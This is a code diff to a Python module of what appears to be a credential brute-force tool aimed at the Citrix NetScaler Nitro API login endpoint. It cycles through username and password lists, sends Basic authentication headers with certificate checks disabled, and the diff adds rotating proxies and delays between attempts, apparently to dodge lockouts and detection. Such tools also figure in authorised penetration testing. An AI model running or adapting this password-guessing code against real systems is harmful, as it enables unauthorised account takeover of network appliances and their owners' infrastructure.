@@ -4,6 +4,8 @@ from core.webModule import webModule
 import base64
 import requests
 from requests import session
+import random
+
 
 class citAPI(webModule):
     def __init__(self, config, display, lock):
@@ -14,10 +16,11 @@ class citAPI(webModule):
         print("Doing something cool...eventually...")
     def connectTest(self, config, payload):
         with session() as c:
+            proxy = random.choice(config["proxies"])
             apiURL = config["HOST"] + "/nitro/v1/config"
             requests.packages.urllib3.disable_warnings()
             c.headers.update(payload)
-            cget = c.get(apiURL, verify=False)
+            cget = c.get(apiURL, verify=False)#, proxies=proxy)
             if "Login Failure" in cget.text:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
             else:
@@ -40,6 +43,7 @@ class citAPI(webModule):
                             'Authorization': 'Basic ' + creds
                             }
                         self.connectTest(config, payload)
+                        time.sleep(config["timeout"])
                 else:
                     config["PASSWORD"] = pass_line.strip('\n')
                     creds = base64.b64encode(config["USERNAME"] + ":" + config["PASSWORD"])
@@ -47,6 +51,7 @@ class citAPI(webModule):
                         'Authorization': 'Basic ' + creds
                         }
                     self.connectTest(config, payload)
+                    time.sleep(config["timeout"])
         elif config["UserFile"]:
             lines = [line.rstrip('\n') for line in open(config["UserFile"])]
             for line in lines:
